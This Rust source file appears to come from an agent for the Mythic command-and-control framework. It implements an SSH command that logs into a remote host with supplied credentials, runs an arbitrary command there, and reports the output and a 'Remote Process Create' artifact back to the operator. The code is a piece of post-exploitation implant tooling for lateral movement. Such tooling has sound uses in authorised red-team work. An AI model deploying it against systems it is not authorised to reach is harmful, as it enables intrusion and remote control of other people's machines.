use crate::AgentTask;
use crate::mythic_success;
use std::error::Error;
use std::result::Result;

use super::SshSession;

pub fn run_cmd(
    sess: &SshSession,
    task: &AgentTask,
    args: &super::SshArgs,
) -> Result<serde_json::Value, Box<dyn Error>> {
    let cmd = args.exec.as_ref().unwrap();
    let (stdout, stderr, exit_status) = sess.channel_exec(cmd)?;

    let mut output = mythic_success!(
        task.id,
        format!(
            "Connection: {}@{}\nCommand status: {}\n\nStdout:\n{}\nStderr:\n{}",
            args.credentials.account, args.host, exit_status, stdout, stderr,
        )
    );

    let output = output.as_object_mut().unwrap();
    output.insert(
        "artifacts".to_string(),
        serde_json::json!([
            {
                "base_artifact": "Remote Proccess Create",
                "artifact": format!("ssh {}@{} -exec {}", args.credentials.account, args.host, cmd)
            }
        ]),
    );

    Ok(serde_json::to_value(output)?)
}
